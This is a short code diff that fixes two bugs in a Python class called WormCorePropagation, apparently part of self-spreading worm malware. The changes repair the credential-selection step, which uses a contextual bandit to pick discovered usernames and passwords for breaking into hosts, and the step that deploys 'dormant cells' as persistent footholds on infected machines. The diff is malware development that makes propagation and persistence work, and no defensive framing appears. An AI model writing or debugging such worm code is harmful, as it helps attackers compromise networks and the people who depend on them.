@@ -75,7 +75,7 @@ class WormCorePropagation:
                     "is_database": host.get("host_type") == "database",
                     "target_count": len(self.infected_hosts),
                 }
-                    bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
+                bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
                 if bandit_cred:
                     username, password, ucb = bandit_cred
                     discovered = [(username, password)] + [
@@ -157,7 +157,7 @@ class WormCorePropagation:
 
         if self.dormant_cells and self.infected_hosts:
             for ip in list(self.infected_hosts)[-3:]:
-                if ip not in [c["host_ip"] for c in self.dormant_cells.cells.values()]:
+                if ip not in [c.host_ip for c in self.dormant_cells.cells.values()]:
                     cell_id = self.dormant_cells.deploy_cell(ip, max_dormant_days=7)
                     logger.info(f"  Dormant cell deployed: {cell_id} on {ip}")
 
